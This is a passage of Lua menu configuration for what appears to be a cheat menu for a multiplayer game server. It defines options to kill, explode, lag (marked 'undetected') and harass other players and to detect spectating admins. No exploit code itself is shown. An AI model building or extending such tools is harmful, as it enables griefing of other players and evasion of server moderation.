            {text = 'fOilVolume',                      extra = 'fOilVolume',                       dkey = 'vehicle:handling_foilvolume', desc = 'Black smoke time before engine dies.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling foilvolume number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fSeatOffsetDistX',                extra = 'fSeatOffsetDistX',                 dkey = 'vehicle:handling_fseatoffsetdistx', desc = 'The distance from the door to the car\nseat.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fseatoffsetdistx number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fSeatOffsetDistY',                extra = 'fSeatOffsetDistY',                 dkey = 'vehicle:handling_fseatoffsetdisty', desc = 'The distance from the door to the car\nseat.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fseatoffsetdisty number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fSeatOffsetDistZ',                extra = 'fSeatOffsetDistZ',                 dkey = 'vehicle:handling_fseatoffsetdistz', desc = 'The distance from the door to the car\nseat.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fseatoffsetdistz number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'nMonetaryValue',                  extra = 'nMonetaryValue',                   dkey = 'vehicle:handling_nmonetaryvalue', desc = 'The vehicle worth.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling nmonetaryvalue number', length = 30, tipus = 'vegyess', func = 'None'},
            },

        ['vehicle:doors'] = {
            {text = 'Open all', dkey = 'vehicle:doors_openalldoors', desc = 'Open every door on the vehicle.', afu = __REAPER1__.M.vehicle.doors.openalldoors, option = __REAPER1__.M.Button},
            {text = 'Close all', dkey = 'vehicle:doors_closealldoors', desc = 'Close every door on the vehicle.', afu = __REAPER1__.M.vehicle.doors.closealldoors, option = __REAPER1__.M.Button},
            {text = 'Toggle lock', dkey = 'vehicle:doors_togglelock', desc = 'Toggle the vehicle lock.', afu = __REAPER1__.M.vehicle.doors.togglelock, option = __REAPER1__.M.Button},
            {text = 'Doors', option = __REAPER1__.M.Separator},
            {text = 'Open', dkey = 'vehicle:doors_open', desc = 'Open the specified door.', afu = __REAPER1__.M.vehicle.doors.open, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Door name', length = 20, tipus = 'betu', func = __REAPER1__.T.VehicleDoors},
            {text = 'Close', dkey = 'vehicle:doors_close', desc = 'Close the specified door.', afu = __REAPER1__.M.vehicle.doors.close, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Door name', length = 20, tipus = 'betu', func = __REAPER1__.T.VehicleDoors},
            {text = 'Delete', dkey = 'vehicle:doors_delete', desc = 'Delete the specified door.', afu = __REAPER1__.M.vehicle.doors.delete, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Door name', length = 20, tipus = 'betu', func = __REAPER1__.T.VehicleDoors},
        },

        ['vehicle:weapons'] = {
            {text = 'Vehicle weapon', dkey = 'vehicle:weapons_vehicleweapon', desc = 'Enable vehicle weapons.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'On key', dkey = 'vehicle:weapons_onkey', desc = 'The key which the weapons can be\nactived with.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle weapon key', length = 5, tipus = 'vegyes', func = __REAPER1__.T.Keys},
            {text = 'Hold', dkey = 'vehicle:weapons_hold', desc = 'If enabled the weapons will shoot when\nthe key is also being held.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Position', dkey = 'vehicle:weapons_position', desc = 'They positioning of the weapons.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle weapon position', length = 10, tipus = 'betu', func = {'Lights', 'Roof', 'Doors'}},
            {text = 'Weapon count', dkey = 'vehicle:weapons_weaponcount', desc = 'The amount of how many weapons\nwill shoot.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle weapon count', length = 1, tipus = 'szam', func = {1, 2, 3}},
            {text = 'Bullet', dkey = 'vehicle:weapons_bullet', desc = 'The weapon bullet/gun type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle weapon bullet', length = 20, tipus = 'betu', func = __REAPER1__.T.WeaponsNoMelee},
            {text = 'Speed', dkey = 'vehicle:weapons_speed', desc = 'The bullet speed. Major differences\nwhen shot projectiles.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle weapon speed', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Laser', dkey = 'vehicle:weapons_laser', desc = 'Enable weapon lasers.', option = __REAPER1__.M.Checkbox, func = false},
        },

        ['vehicle:ramps'] = {
            {text = 'Attach ramp', dkey = 'vehicle:ramps_attachramp', desc = 'Attach a ramp.', afu = __REAPER1__.M.vehicle.ramps.attach, option = __REAPER1__.M.Button},
            {text = 'Delete ramp', dkey = 'vehicle:ramps_deleteramp', desc = 'Delete the current ramp.', afu = __REAPER1__.M.vehicle.ramps.delete, option = __REAPER1__.M.Button},
            {text = 'Ramp type', dkey = 'vehicle:ramps_ramptype', desc = 'The ramp type.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ramp type', length = 20, tipus = 'betu', func = {'Gray Ramp Big', 'Gray Ramp Big 2', 'Gray Ramp Small', 'Green Ramp', 'Stunt Ramp Small', 'Stunt Ramp Medium', 'Stunt Ramp Big'}},
            {text = 'Vehicle part', dkey = 'vehicle:ramps_vehiclepart', desc = 'The part which the ramp should be\nattached to.', option = __REAPER1__.M.Combo, cindex = 106, sindex = 106, textboxtext = 'Vehicle part', length = 20, tipus = 'betu', func = {'chassis', 'chassis_lowlod', 'chassis_dummy', 'seat_dside_f', 'seat_dside_r', 'seat_dside_r1', 'seat_dside_r2', 'seat_dside_r3', 'seat_dside_r4', 'seat_dside_r5', 'seat_dside_r6', 'seat_dside_r7', 'seat_pside_f', 'seat_pside_r', 'seat_pside_r1', 'seat_pside_r2', 'seat_pside_r3', 'seat_pside_r4', 'seat_pside_r5', 'seat_pside_r6', 'seat_pside_r7', 'window_lf1', 'window_lf2', 'window_lf3', 'window_rf1', 'window_rf2', 'window_rf3', 'window_lr1', 'window_lr2', 'window_lr3', 'window_rr1', 'window_rr2', 'window_rr3', 'door_dside_f', 'door_dside_r', 'door_pside_f', 'door_pside_r', 'handle_dside_f', 'handle_dside_r', 'handle_pside_f', 'handle_pside_r', 'wheel_lf', 'wheel_rf', 'wheel_lm1', 'wheel_rm1', 'wheel_lm2', 'wheel_rm2', 'wheel_lm3', 'wheel_rm3', 'wheel_lr', 'wheel_rr', 'suspension_lf', 'suspension_rf', 'suspension_lm', 'suspension_rm', 'suspension_lr', 'suspension_rr', 'spring_rf', 'spring_lf', 'spring_rr', 'spring_lr', 'transmission_f', 'transmission_m', 'transmission_r', 'hub_lf', 'hub_rf', 'hub_lm1', 'hub_rm1', 'hub_lm2', 'hub_rm2', 'hub_lm3', 'hub_rm3', 'hub_lr', 'hub_rr', 'windscreen', 'windscreen_r', 'window_lf', 'window_rf', 'window_lr', 'window_rr', 'window_lm', 'window_rm', 'bodyshell', 'bumper_f', 'bumper_r', 'wing_rf', 'wing_lf', 'bonnet', 'boot', 'exhaust', 'exhaust_2', 'exhaust_3', 'exhaust_4', 'exhaust_5', 'exhaust_6', 'exhaust_7', 'exhaust_8', 'exhaust_9', 'exhaust_10', 'exhaust_11', 'exhaust_12', 'exhaust_13', 'exhaust_14', 'exhaust_15', 'exhaust_16', 'engine', 'overheat', 'overheat_2', 'petrolcap', 'petroltank', 'petroltank_l', 'petroltank_r', 'steering', 'hbgrip_l', 'hbgrip_r', 'headlight_l', 'headlight_r', 'taillight_l', 'taillight_r', 'indicator_lf', 'indicator_rf', 'indicator_lr', 'indicator_rr', 'brakelight_l', 'brakelight_r', 'brakelight_m', 'reversinglight_l', 'reversinglight_r', 'extralight_1', 'extralight_2', 'extralight_3', 'extralight_4', 'numberplate', 'interiorlight', 'siren1', 'siren2', 'siren3', 'siren4', 'siren5', 'siren6', 'siren7', 'siren8', 'siren9', 'siren10', 'siren11', 'siren12', 'siren13', 'siren14', 'siren15', 'siren16', 'siren17', 'siren18', 'siren19', 'siren20', 'siren_glass1', 'siren_glass2', 'siren_glass3', 'siren_glass4', 'siren_glass5', 'siren_glass6', 'siren_glass7', 'siren_glass8', 'siren_glass9', 'siren_glass10', 'siren_glass11', 'siren_glass12', 'siren_glass13', 'siren_glass14', 'siren_glass15', 'siren_glass16', 'siren_glass17', 'siren_glass18', 'siren_glass19', 'siren_glass20', 'spoiler', 'struts', 'misc_a', 'misc_b', 'misc_c', 'misc_d', 'misc_e', 'misc_f', 'misc_g', 'misc_h', 'misc_i', 'misc_j', 'misc_k', 'misc_l', 'misc_m', 'misc_n', 'misc_o', 'misc_p', 'misc_q', 'misc_r', 'misc_s', 'misc_t', 'misc_u', 'misc_v', 'misc_w', 'misc_x', 'misc_y', 'misc_z', 'misc_1', 'misc_2', 'weapon_1a', 'weapon_1b', 'weapon_1c', 'weapon_1d', 'weapon_1a_rot', 'weapon_1b_rot', 'weapon_1c_rot', 'weapon_1d_rot', 'weapon_2a', 'weapon_2b', 'weapon_2c', 'weapon_2d', 'weapon_2a_rot', 'weapon_2b_rot', 'weapon_2c_rot', 'weapon_2d_rot', 'weapon_3a', 'weapon_3b', 'weapon_3c', 'weapon_3d', 'weapon_3a_rot', 'weapon_3b_rot', 'weapon_3c_rot', 'weapon_3d_rot', 'weapon_4a', 'weapon_4b', 'weapon_4c', 'weapon_4d', 'weapon_4a_rot', 'weapon_4b_rot', 'weapon_4c_rot', 'weapon_4d_rot', 'turret_1base', 'turret_1barrel', 'turret_2base', 'turret_2barrel', 'turret_3base', 'turret_3barrel', 'ammobelt', 'searchlight_base', 'searchlight_light', 'attach_female', 'roof', 'roof2', 'soft_1', 'soft_2', 'soft_3', 'soft_4', 'soft_5', 'soft_6', 'soft_7', 'soft_8', 'soft_9', 'soft_10', 'soft_11', 'soft_12', 'soft_13', 'forks', 'mast', 'carriage', 'fork_l', 'fork_r', 'forks_attach', 'frame_1', 'frame_2', 'frame_3', 'frame_pickup_1', 'frame_pickup_2', 'frame_pickup_3', 'frame_pickup_4', 'freight_cont', 'freight_bogey', 'freightgrain_slidedoor', 'door_hatch_r', 'door_hatch_l', 'tow_arm', 'tow_mount_a', 'tow_mount_b', 'tipper', 'combine_reel', 'combine_auger', 'slipstream_l', 'slipstream_r', 'arm_1', 'arm_2', 'arm_3', 'arm_4', 'scoop', 'boom', 'stick', 'bucket', 'shovel_2', 'shovel_3', 'Lookat_UpprPiston_head', 'Lookat_LowrPiston_boom', 'Boom_Driver', 'cutter_driver', 'vehicle_blocker', 'extra_1', 'extra_2', 'extra_3', 'extra_4', 'extra_5', 'extra_6', 'extra_7', 'extra_8', 'extra_9', 'extra_ten', 'extra_11', 'extra_12', 'break_extra_1', 'break_extra_2', 'break_extra_3', 'break_extra_4', 'break_extra_5', 'break_extra_6', 'break_extra_7', 'break_extra_8', 'break_extra_9', 'break_extra_10', 'mod_col_1', 'mod_col_2', 'mod_col_3', 'mod_col_4', 'mod_col_5', 'handlebars', 'forks_u', 'forks_l', 'wheel_f', 'swingarm', 'wheel_r', 'crank', 'pedal_r', 'pedal_l', 'static_prop', 'moving_prop', 'static_prop2', 'moving_prop2', 'rudder', 'rudder2', 'wheel_rf1_dummy', 'wheel_rf2_dummy', 'wheel_rf3_dummy', 'wheel_rb1_dummy', 'wheel_rb2_dummy', 'wheel_rb3_dummy', 'wheel_lf1_dummy', 'wheel_lf2_dummy', 'wheel_lf3_dummy', 'wheel_lb1_dummy', 'wheel_lb2_dummy', 'wheel_lb3_dummy', 'bogie_front', 'bogie_rear', 'rotor_main', 'rotor_rear', 'rotor_main_2', 'rotor_rear_2', 'elevators', 'tail', 'outriggers_l', 'outriggers_r', 'rope_attach_a', 'rope_attach_b', 'prop_1', 'prop_2', 'elevator_l', 'elevator_r', 'rudder_l', 'rudder_r', 'prop_3', 'prop_4', 'prop_5', 'prop_6', 'prop_7', 'prop_8', 'rudder_2', 'aileron_l', 'aileron_r', 'airbrake_l', 'airbrake_r', 'wing_l', 'wing_r', 'wing_lr', 'wing_rr', 'engine_l', 'engine_r', 'nozzles_f', 'nozzles_r', 'afterburner', 'wingtip_1', 'wingtip_2', 'gear_door_fl', 'gear_door_fr', 'gear_door_rl1', 'gear_door_rr1', 'gear_door_rl2', 'gear_door_rr2', 'gear_door_rml', 'gear_door_rmr', 'gear_f', 'gear_rl', 'gear_lm1', 'gear_rr', 'gear_rm1', 'gear_rm', 'prop_left', 'prop_right', 'legs', 'attach_male', 'draft_animal_attach_lr', 'draft_animal_attach_rr', 'draft_animal_attach_lm', 'draft_animal_attach_rm', 'draft_animal_attach_lf', 'draft_animal_attach_rf', 'wheelcover_l', 'wheelcover_r', 'barracks', 'pontoon_l', 'pontoon_r', 'no_ped_col_step_l', 'no_ped_col_strut_1_l', 'no_ped_col_strut_2_l', 'no_ped_col_step_r', 'no_ped_col_strut_1_r', 'no_ped_col_strut_2_r', 'light_cover', 'emissives', 'neon_l', 'neon_r', 'neon_f', 'neon_b', 'dashglow', 'doorlight_lf', 'doorlight_rf', 'doorlight_lr', 'doorlight_rr', 'unknown_id', 'dials', 'engineblock', 'bobble_head', 'bobble_base', 'bobble_hand', 'chassis_Control'}},
            {text = 'Offset', dkey = 'vehicle:ramps_offset', desc = 'The offset of the ramp.', afu = __REAPER1__.M.vehicle.ramps.offset, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Ramp offset number', length = 30, tipus = 'szam', func = '0.0 0.0 0.0'},
            {text = 'Rotation', dkey = 'vehicle:ramps_rotation', desc = 'The rotation of the ramp.', afu = __REAPER1__.M.vehicle.ramps.rotation, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ramp rotation number', length = 3, tipus = 'szam', func = {}},
            {text = 'Invisible', dkey = 'vehicle:ramps_invisible', desc = 'Toggle the ramp visibility.', afu = __REAPER1__.M.vehicle.ramps.invisible, option = __REAPER1__.M.Checkbox, func = false},
        },

        ['server'] = {
            {text = 'Online players', dkey = 'server:onlineplayers', desc = 'Online players menu.', option = __REAPER1__.M.Menu_Button, func = {'server', 'server:onlineplayers'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'All players', dkey = 'server:allplayers', desc = 'All players menu.', option = __REAPER1__.M.Menu_Button, func = {'server', 'server:allplayers'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Targeting list', dkey = 'server:targetinglist', desc = 'Targeting list menu.', option = __REAPER1__.M.Menu_Button, func = {'server', 'server:targetinglist'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Spectating', option = __REAPER1__.M.Separator},
            {text = 'Spectator list', dkey = 'server_spectatorlist', desc = 'Enable a list to see the spectating admins.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Only on me', dkey = 'server_onlyonme', desc = 'It will only display spectating admins\nif they are spectating you.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Time since start', dkey = 'server_timesincespec', desc = 'The time since they started spectating.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Coordinates', dkey = 'server_spectatorcoords', desc = 'The spectator admin\'s coords.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Protection', option = __REAPER1__.M.Separator},
            {text = 'Safe space', dkey = 'server_safespace', desc = 'Put yourself into a safe space.', afu = __REAPER1__.M.server.safespace, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Anti particle (ptfx)', dkey = 'server_antipart', desc = 'Remove particles (ptfx) in a desired range around you.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Anti particle range number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Tizezres},
            {text = 'Behaviour', dkey = 'server_behav', desc = 'What to do with the modded (anti) entities.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Anti modder behaviour', length = 20, tipus = 'betu', func = {'Delete', 'Send back', 'Delete & Send back'}},
            {text = 'Anti clone', dkey = 'server_anticlone', desc = 'Disable a modder cloning you.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Anti attach', dkey = 'server_antiattach', desc = 'Disable a modder attaching props to you.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Anti vehicle lag', dkey = 'server_antiveh', desc = 'Delete modded vehicles around you that\nlag.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Anti vehicle lag range number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Tizezres},
        },

        ['server:onlineplayers'] = {
        },

        ['server:allplayers'] = {
            {text = 'Include self', dkey = 'server:allplayers_includeself', desc = 'Include yourself in the actions.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Submenus', option = __REAPER1__.M.Separator},
            {text = 'Exploits (undetected)', dkey = 'server:allplayers:exploits', desc = 'Exploits menu.', option = __REAPER1__.M.Menu_Button, func = {'server:allplayers', 'server:allplayers:exploits'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Vehicle', dkey = 'server:allplayers:vehicle', desc = 'Vehicle menu.', option = __REAPER1__.M.Menu_Button, func = {'server:allplayers', 'server:allplayers:vehicle'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Weapon', dkey = 'server:allplayers:weapon', desc = 'Weapon menu.', option = __REAPER1__.M.Menu_Button, func = {'server:allplayers', 'server:allplayers:weapon'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Sound', dkey = 'server:allplayers:sound', desc = 'Sound menu.', option = __REAPER1__.M.Menu_Button, func = {'server:allplayers', 'server:allplayers:sound'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Explode', dkey = 'server:allplayers:explosion', desc = 'Explode menu.', option = __REAPER1__.M.Menu_Button, func = {'server:allplayers', 'server:allplayers:explosion'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Trigger', dkey = 'server:allplayers:trigger', desc = 'Trigger menu.', option = __REAPER1__.M.Menu_Button, func = {'server:allplayers', 'server:allplayers:trigger'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Particle', dkey = 'server:allplayers:particle', desc = 'Particle menu.', option = __REAPER1__.M.Menu_Button, func = {'server:allplayers', 'server:allplayers:particle'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Attach', dkey = 'server:allplayers:attach', desc = 'Attach menu.', option = __REAPER1__.M.Menu_Button, func = {'server:allplayers', 'server:allplayers:attach'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'General', option = __REAPER1__.M.Separator},
            {text = 'Kill', dkey = 'server:allplayers_kill', desc = 'Kill the players silently or under your\nname.', afu = __REAPER1__.M.aplayers.kill, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Kill type', length = 10, tipus = 'betu', func = {'Normal', 'Silent'}},
            {text = 'Taze', dkey = 'server:allplayers_taze', desc = 'Taze the players.', afu = __REAPER1__.M.aplayers.taze, option = __REAPER1__.M.Button},
            {text = 'Burn', dkey = 'server:allplayers_burn', desc = 'Burn the players.', afu = __REAPER1__.M.aplayers.burn, option = __REAPER1__.M.Button},
            {text = 'Cage', dkey = 'server:allplayers_cage', desc = 'Toggle the cage on the players.', afu = __REAPER1__.M.aplayers.cage, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Demi god', dkey = 'server:allplayers_demigod', desc = 'Toggle the demi god mode on the\nplayers.', afu = __REAPER1__.M.aplayers.demigod, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Alpha', dkey = 'server:allplayers_alpha', desc = 'Set the players\'s alpha.', afu = __REAPER1__.M.aplayers.alpha, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Alpha number', length = 3, tipus = 'szam', func = __REAPER1__.T.AlphaValues},
            {text = 'Bring vehicles', dkey = 'server:allplayers_vehtome', desc = 'Teleport the players\'s vehicle to me.', afu = __REAPER1__.M.aplayers.vehtome, option = __REAPER1__.M.Button},
            {text = 'Peds', option = __REAPER1__.M.Separator},
            {text = 'Clone', dkey = 'server:allplayers_clone', desc = 'Clone the players.', afu = __REAPER1__.M.aplayers.clone, option = __REAPER1__.M.Button},
            {text = 'Attack by clones', dkey = 'server:allplayers_attackbyclones', desc = 'Attack the players by their clones.', afu = __REAPER1__.M.aplayers.attackc, option = __REAPER1__.M.Button},
            {text = 'Attack by SWAT', dkey = 'server:allplayers_attackbyswat', desc = 'Attack the players by a SWAT team.', afu = __REAPER1__.M.aplayers.attacks, option = __REAPER1__.M.Button},
            {text = 'Spawn bodyguards', dkey = 'server:allplayers_spawnbodyguard', desc = 'Spawn bodyguards for the players.', afu = __REAPER1__.M.aplayers.bodyg, option = __REAPER1__.M.Button},
        },
        
        ['server:allplayers:exploits'] = {
            {text = 'Bug vehicle', dkey = 'server:allplayers:exploits_bugvehicle', desc = 'Bug the player\'s vehicle.', afu = __REAPER1__.M.aplayers.exploits.bugveh, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Lagging', option = __REAPER1__.M.Separator},
            {text = 'Lag amount', dkey = 'server:allplayers:exploits_lagamount', desc = 'Set the amount of lagging vehicles.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Lag amount number', length = 2, tipus = 'szam', func = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15}},
            {text = 'Clean up', dkey = 'server:allplayers:exploits_cleanup', desc = 'Clean up the spawned vehicles.', afu = __REAPER1__.M.aplayers.exploits.cleanup, option = __REAPER1__.M.Button},
            {text = 'Plane', dkey = 'server:allplayers:exploits_planes', desc = 'Lag the player with planes.', afu = __REAPER1__.M.aplayers.exploits.lag, option = __REAPER1__.M.Button, extra = `cargoplane`},
            {text = 'Plane 2', dkey = 'server:allplayers:exploits_planes2', desc = 'Lag the player with planes.', afu = __REAPER1__.M.aplayers.exploits.lag, option = __REAPER1__.M.Button, extra = `jet`},
            {text = 'Blimp', dkey = 'server:allplayers:exploits_blimp', desc = 'Lag the player with blimps.', afu = __REAPER1__.M.aplayers.exploits.lag, option = __REAPER1__.M.Button, extra = `blimp`},
            {text = 'Tank', dkey = 'server:allplayers:exploits_tank', desc = 'Lag the player with tanks.', afu = __REAPER1__.M.aplayers.exploits.lag, option = __REAPER1__.M.Button, extra = `rhino`},
        },

        ['server:allplayers:explosion'] = {
            {text = 'Explode', dkey = 'server:allplayers:explosion_explode', desc = 'Explode the players.', afu = __REAPER1__.M.aplayers.explosion.explode, option = __REAPER1__.M.Button},
            {text = 'Loop explode', dkey = 'server:allplayers:explosion_loopexplode', desc = 'Loop exploding the players.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Type', dkey = 'server:allplayers:explosion_type', desc = 'Select the type of the explosion.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Explosion type', length = 10, tipus = 'betu', func = __REAPER1__.T.Explosions},
            {text = 'Damage', dkey = 'server:allplayers:explosion_damage', desc = 'The damage of the explosion.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Explosion damage number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Invisible', dkey = 'server:allplayers:explosion_invisible', desc = 'Make the explosion invisible.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Audible', dkey = 'server:allplayers:explosion_audible', desc = 'Make the explosion audible.', option = __REAPER1__.M.Checkbox, func = false},
        },
        
        ['server:allplayers:vehicle'] = {
            {text = 'Delete', dkey = 'server:allplayers:vehiclev_deletevehicle', desc = 'Delete the vehicle the players are sitting\nin.', afu = __REAPER1__.M.aplayers.vehicle.deletevehicle, option = __REAPER1__.M.Button},
            {text = 'Launch', dkey = 'server:allplayers:vehiclev_launchvehicle', desc = 'Launch the players\'s vehicle in the sky.', afu = __REAPER1__.M.aplayers.vehicle.launchveh, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Launch power number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Remove wheels', dkey = 'server:allplayers:vehiclev_removewheels', desc = 'Remove the wheels of the vehicle the\nplayers are sitting in.', afu = __REAPER1__.M.aplayers.vehicle.removewheels, option = __REAPER1__.M.Button},
            {text = 'Set speed (kmh)', dkey = 'server:allplayers:vehiclev_setspeed', desc = 'Set the speed of the vehicle the players\nare sitting in.', afu = __REAPER1__.M.aplayers.vehicle.setspeed, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Speed number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Clone', dkey = 'server:allplayers:vehiclev_clonevehicle', desc = 'Clone the vehicle the players are\nsitting in.', afu = __REAPER1__.M.aplayers.vehicle.cloneveh, option = __REAPER1__.M.Button},
            {text = 'Freeze', dkey = 'server:allplayers:vehiclev_freeze', desc = 'Freeze the vehicle the players are\nsitting in.', afu = __REAPER1__.M.aplayers.vehicle.freeze, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Customs', option = __REAPER1__.M.Separator},
            {text = 'Fuck up', dkey = 'server:allplayers:vehiclev_fuckup', desc = 'Fuck up the vehicle the players are\nsitting in.', afu = __REAPER1__.M.aplayers.vehicle.fuckup, option = __REAPER1__.M.Button},
            {text = 'Tune', dkey = 'server:allplayers:vehiclev_tune', desc = 'Tune the vehicle the players are sitting\nin.', afu = __REAPER1__.M.aplayers.vehicle.tune, option = __REAPER1__.M.Button},
            {text = 'Downgrade', dkey = 'server:allplayers:vehiclev_downgrade', desc = 'Downgrade the vehicle the players\nare sitting in.', afu = __REAPER1__.M.aplayers.vehicle.downgrade, option = __REAPER1__.M.Button},
            {text = 'Fix', dkey = 'server:allplayers:vehiclev_fix', desc = 'Fix the vehicle the players are sitting in.', afu = __REAPER1__.M.aplayers.vehicle.fix, option = __REAPER1__.M.Button},
            {text = 'Randomize', dkey = 'server:allplayers:vehiclev_randomize', desc = 'Randomize the vehicle the players\nare sitting in.', afu = __REAPER1__.M.aplayers.vehicle.randomize, option = __REAPER1__.M.Button},
            {text = 'Misc', option = __REAPER1__.M.Separator},
            {text = 'Fuel', dkey = 'server:allplayers:vehiclev_fuel', desc = 'Set fuel in the vehicle the players\nare sitting in.', afu = __REAPER1__.M.aplayers.vehicle.fuel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Fuel amount number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Door lock', dkey = 'server:allplayers:vehiclev_doorlock', desc = 'Toggle the door lock for the vehicle\nthe players are sitting in.', afu = __REAPER1__.M.aplayers.vehicle.lock, option = __REAPER1__.M.Button},
            {text = 'Open door', dkey = 'server:allplayers:vehiclev_opendoor', desc = 'Open a specified door in the vehicle\nthe players are sitting in.', afu = __REAPER1__.M.aplayers.vehicle.open, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Door name', length = 10, tipus = 'betu', func = __REAPER1__.T.VehicleDoors},
            {text = 'Close door', dkey = 'server:allplayers:vehiclev_closedoor', desc = 'Close a specified door in the vehicle\nthe players are sitting in.', afu = __REAPER1__.M.aplayers.vehicle.close, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Door name', length = 10, tipus = 'betu', func = __REAPER1__.T.VehicleDoors},
            {text = 'Delete door', dkey = 'server:allplayers:vehiclev_deletedoor', desc = 'Delete a specified door in the vehicle\nthe players are sitting in.', afu = __REAPER1__.M.aplayers.vehicle.delete, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Door name', length = 10, tipus = 'betu', func = __REAPER1__.T.VehicleDoors},
            {text = 'Flip', dkey = 'server:allplayers:vehiclev_flip', desc = 'Flip upside down the vehicle the\nplayers are sitting in.', afu = __REAPER1__.M.aplayers.vehicle.flip, option = __REAPER1__.M.Button},
        },
        
        ['server:allplayers:weapon'] = {
            {text = 'Give weapon', dkey = 'server:allplayers:weapon_giveweapon', desc = 'Give a chosen weapon to the players.', afu = __REAPER1__.M.aplayers.weapon.give, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon name', length = 30, tipus = 'vegyes', func = __REAPER1__.T.Weapons},
            {text = 'Spawn weapon', dkey = 'server:allplayers:weapon_spawnweapon', desc = 'Spawn a chosen weapon to the players.', afu = __REAPER1__.M.aplayers.weapon.spawn, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon name', length = 30, tipus = 'vegyes', func = __REAPER1__.T.Weapons},
            {text = 'Remove weapon', dkey = 'server:allplayers:weapon_removeweapon', desc = 'Remove a chosen weapon from\nthe players.', afu = __REAPER1__.M.aplayers.weapon.remove, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon name', length = 30, tipus = 'vegyes', func = __REAPER1__.T.Weapons},
            {text = 'Remove current', dkey = 'server:allplayers:weapon_removecurrent', desc = 'Remove the current weapon of\nthe players.', afu = __REAPER1__.M.aplayers.weapon.removec, option = __REAPER1__.M.Button},
            {text = 'Ammo', dkey = 'server:allplayers:weapon_ammo', desc = 'Remove or give a weapon with this\nammo count.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo amount number', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Exploding bullets', option = __REAPER1__.M.Separator},
